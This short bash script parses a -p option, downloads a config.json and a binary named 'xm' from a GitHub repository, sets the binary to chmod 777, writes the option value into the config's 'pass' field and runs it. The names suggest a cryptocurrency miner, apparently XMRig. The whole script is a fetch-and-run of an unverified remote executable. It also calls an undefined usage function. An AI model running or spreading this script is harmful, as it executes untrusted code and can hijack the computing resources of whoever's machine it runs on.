#!/bin/bash
p_value="6"

while getopts ":p:h" opt; do
    case $opt in
        p)
            p_value="$OPTARG"
            ;;
        \?)
            echo "无效选项: -$OPTARG" >&2
            usage
            ;;
        :)
            echo "选项 -$OPTARG 需要一个参数" >&2
            usage
            ;;
    esac
done
echo "p 参数的值是: $p_value"
wget https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/config.json
wget https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/xm
chmod 777 xm
sed -i 's/"pass": "3",/"pass": "'$p_value'",/' config.json

./xm
